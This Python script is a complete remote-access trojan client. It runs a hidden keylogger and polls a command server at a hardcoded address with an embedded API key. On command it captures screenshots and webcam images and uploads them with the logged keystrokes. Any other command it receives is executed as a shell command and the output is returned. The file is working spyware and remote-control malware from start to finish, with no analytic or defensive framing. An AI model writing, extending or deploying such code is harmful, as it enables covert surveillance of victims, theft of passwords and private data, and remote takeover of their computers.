import requests
import time
import os
import threading
import subprocess

# === CONFIGURATION ===
SERVER_URL = "http://192.168.8.132:5000"
API_KEY = "BfgJ4#hx7K&*G2se2jbNEV#m!X024$"
HEADERS = {"X-API-KEY": API_KEY}

# === LOG FILE PATHS ===
TEMP_DIR = os.getenv("TEMP") or "/tmp"
SCREENSHOT_PATH = os.path.join(TEMP_DIR, "screenshot.png")
WEBCAM_PATH = os.path.join(TEMP_DIR, "webcam.png")
KEYLOG_PATH = os.path.join(TEMP_DIR, "keys.txt")

# === KEYLOGGER THREAD ===
def start_keylogger():
    from pynput import keyboard

    def on_press(key):
        try:
            with open(KEYLOG_PATH, "a") as f:
                f.write(f"{key}\n")
        except:
            pass

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# Start keylogger in background
threading.Thread(target=start_keylogger, daemon=True).start()

# === MAIN LOOP ===
while True:
    try:
        # Get command from server
        r = requests.get(f"{SERVER_URL}/get_command", headers=HEADERS)
        command = r.json().get("command", "").strip()

        if not command:
            time.sleep(1)
            continue

        if command == "screenshot":
            try:
                import pyautogui
                screenshot = pyautogui.screenshot()
                screenshot.save(SCREENSHOT_PATH)
                requests.post(f"{SERVER_URL}/upload", files={"file": open(SCREENSHOT_PATH, "rb")}, headers=HEADERS)
            except Exception as e:
                requests.post(f"{SERVER_URL}/post_output", json={"output": f"[ERROR] Screenshot failed: {e}"}, headers=HEADERS)

        elif command == "webcam":
            try:
                import cv2
                cam = cv2.VideoCapture(0)
                ret, frame = cam.read()
                if ret:
                    cv2.imwrite(WEBCAM_PATH, frame)
                    requests.post(f"{SERVER_URL}/upload", files={"file": open(WEBCAM_PATH, "rb")}, headers=HEADERS)
                else:
                    requests.post(f"{SERVER_URL}/post_output", json={"output": "[ERROR] Webcam not accessible."}, headers=HEADERS)
                cam.release()
            except Exception as e:
                requests.post(f"{SERVER_URL}/post_output", json={"output": f"[ERROR] Webcam capture failed: {e}"}, headers=HEADERS)

        elif command == "sendlogs":
            if os.path.exists(KEYLOG_PATH):
                requests.post(f"{SERVER_URL}/upload", files={"file": open(KEYLOG_PATH, "rb")}, headers=HEADERS)
            else:
                requests.post(f"{SERVER_URL}/post_output", json={"output": "[ERROR] No keylog file found."}, headers=HEADERS)

        else:
            # Run as shell command
            result = subprocess.getoutput(command)
            requests.post(f"{SERVER_URL}/post_output", json={"output": result}, headers=HEADERS)

    except Exception:
        pass

    time.sleep(1)
